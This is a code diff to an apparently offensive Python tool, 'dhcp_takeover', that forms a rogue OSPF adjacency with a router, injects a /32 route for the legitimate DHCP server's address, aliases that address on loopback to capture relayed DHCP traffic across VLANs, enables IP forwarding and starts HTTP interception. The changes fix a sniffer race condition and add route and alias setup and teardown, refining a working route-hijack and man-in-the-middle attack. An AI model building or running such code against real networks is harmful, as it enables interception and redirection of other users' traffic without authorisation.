@@ -71,6 +71,8 @@ from dhcp_takeover import (
     set_static_address,
     get_interface_ipv4_addresses,
     wait_for_interface_ipv4_address,
+    add_loopback_ipv4_address,
+    remove_loopback_ipv4_address,
     build_server_details_from_ospf,
     sniff_for_dhcp_discover_and_request,
 )
@@ -308,43 +310,78 @@ def debug_menu(networks: list, proposed_leases: dict, server_details: dict,
 # ── Network setup + OSPF adjacency ───────────────────────────────────────────
 
 def setup_and_form_adjacency(interface, ospf_params, target_ip=None):
-    """Configure our IP from the OSPF-learned subnet, do one untagged DHCPDISCOVER
-    to learn the real server IP and DNS, then form the OSPF adjacency.
+    """Configure our IP, discover the real DHCP server, form OSPF adjacency.
 
-    Returns (ospf_interface, our_ip, offer) where offer may be None if the real
-    DHCP server did not respond.
+    Steps:
+      1. Reuse existing IP on the interface if it's already in the OSPF subnet,
+         otherwise pick one and configure it.
+      2. Start the DHCPOFFER sniffer BEFORE sending the discover (avoids the
+         race where the offer arrives before the sniffer is ready).
+      3. Add a default route via the SVI so forwarded packets reach the internet.
+      4. Add a loopback alias for the real DHCP server IP so the kernel accepts
+         relayed packets addressed to it (cross-VLAN DHCP relay).
+      5. Launch the OSPF adjacency engine and wait for LS exchange.
+
+    Returns (interface, our_ip, offer, dhcp_server_ip).
+    dhcp_server_ip is the loopback-aliased real server IP, or None.
     """
     import ipaddress as _ip
     netmask = ospf_params["netmask"]
     subnet = _ip.IPv4Network(f"{ospf_params['src_ip']}/{netmask}", strict=False)
-    gateway = _ip.IPv4Address(ospf_params["src_ip"])
+    svi_ip = ospf_params["src_ip"]
 
+    # ── Step 1: pick / reuse interface IP ────────────────────────────────────
     our_ip = None
     for addr_prefix in get_interface_ipv4_addresses(interface):
         addr = addr_prefix.split("/")[0]
         try:
             candidate = _ip.IPv4Address(addr)
-            if candidate in subnet and candidate != gateway:
+            if candidate in subnet and str(candidate) != svi_ip:
                 our_ip = addr
-                print_step("OK", f"Reusing existing IP {our_ip} on {interface} (already in OSPF subnet {subnet})")
+                print_step("OK", f"Reusing existing IP {our_ip} on {interface} (in OSPF subnet {subnet})")
                 break
         except ValueError:
             continue
 
     if our_ip is None:
         our_ip = pick_client_ip(ospf_params)
-        print_step("START", f"Configuring {our_ip}/{netmask} on {interface} (OSPF-derived)")
+        print_step("START", f"Configuring {our_ip}/{netmask} on {interface}")
         set_static_address(interface, our_ip, netmask)
         wait_for_interface_ipv4_address(interface, expected_address=our_ip)
 
-    # Single untagged discover — no 802.1Q, no trunk needed.
-    send_dhcpdiscover(interface)
-    offer = sniff_dhcpoffer(interface, timeout=10)
+    # ── Step 2: concurrent DHCPDISCOVER + sniffer ─────────────────────────────
+    # Start the sniffer first, then send — avoids the race where the offer
+    # arrives in the window before sniff() installs its BPF filter.
+    offer_result = [None]
 
-    route_ip = target_ip or (offer.get("server_id") if offer else None) or our_ip
+    def _sniff():
+        offer_result[0] = sniff_dhcpoffer(interface, timeout=10)
+
+    sniff_thread = threading.Thread(target=_sniff, daemon=True)
+    sniff_thread.start()
+    time.sleep(0.3)  # let BPF filter install before sending
+    send_dhcpdiscover(interface)
+    sniff_thread.join()
+    offer = offer_result[0]
+
+    # ── Step 3: default route via SVI ─────────────────────────────────────────
+    ospf_adjacency.add_default_route(svi_ip, interface)
+
+    # ── Step 4: loopback alias for real DHCP server IP ───────────────────────
+    # Without this, relayed DHCP unicast (dst = real server IP) triggers ICMP
+    # unreachable from our kernel, aborting the relay on the router.
+    dhcp_server_ip = target_ip or (offer.get("server_id") if offer else None)
+    if dhcp_server_ip and dhcp_server_ip != our_ip:
+        try:
+            add_loopback_ipv4_address(dhcp_server_ip)
+        except Exception as exc:
+            print_step("WARN", f"Could not add loopback alias for {dhcp_server_ip}: {exc}")
+            dhcp_server_ip = None
+
+    route_ip = dhcp_server_ip or our_ip
     print_step("OK", f"OSPF /32 injection target: {route_ip}")
 
-    # OSPF engine runs in its own terminal so its interactive menu stays usable.
+    # ── Step 5: OSPF adjacency ────────────────────────────────────────────────
     ospf_adjacency.launch_in_terminal(
         interface,
         auto_route_ip=route_ip,
@@ -353,7 +390,7 @@ def setup_and_form_adjacency(interface, ospf_params, target_ip=None):
         dead_interval=ospf_params["dead_interval"],
     )
     ospf_adjacency.wait_for_adjacency_exchange(interface, our_ip)
-    return interface, our_ip, offer
+    return interface, our_ip, offer, dhcp_server_ip
 
 
 def start_http_intercept(sniff_iface):
@@ -391,10 +428,11 @@ def main():
     # Enable IP forwarding early; save old value for teardown.
     saved_ip_forward = ospf_adjacency.enable_ip_forwarding()
 
-    ospf_iface_for_fwd = None  # set after setup; used in teardown
+    ospf_iface_for_fwd = None
+    loopback_alias_ip = None
     try:
         # ── Phase 2+3: configure IP, untagged discover, OSPF adjacency ───────
-        ospf_interface, our_ip, offer = setup_and_form_adjacency(
+        ospf_interface, our_ip, offer, loopback_alias_ip = setup_and_form_adjacency(
             interface, ospf_params, target_ip=args.target
         )
         ospf_iface_for_fwd = ospf_interface
@@ -450,6 +488,9 @@ def main():
         print_step("START", "Teardown: removing forwarding rules and restoring system state")
         if ospf_iface_for_fwd:
             ospf_adjacency.teardown_forwarding(ospf_iface_for_fwd, interface)
+            ospf_adjacency.remove_default_route(ospf_params["src_ip"], ospf_iface_for_fwd)
+        if loopback_alias_ip:
+            remove_loopback_ipv4_address(loopback_alias_ip)
         ospf_adjacency.restore_ip_forwarding(saved_ip_forward)
 
 
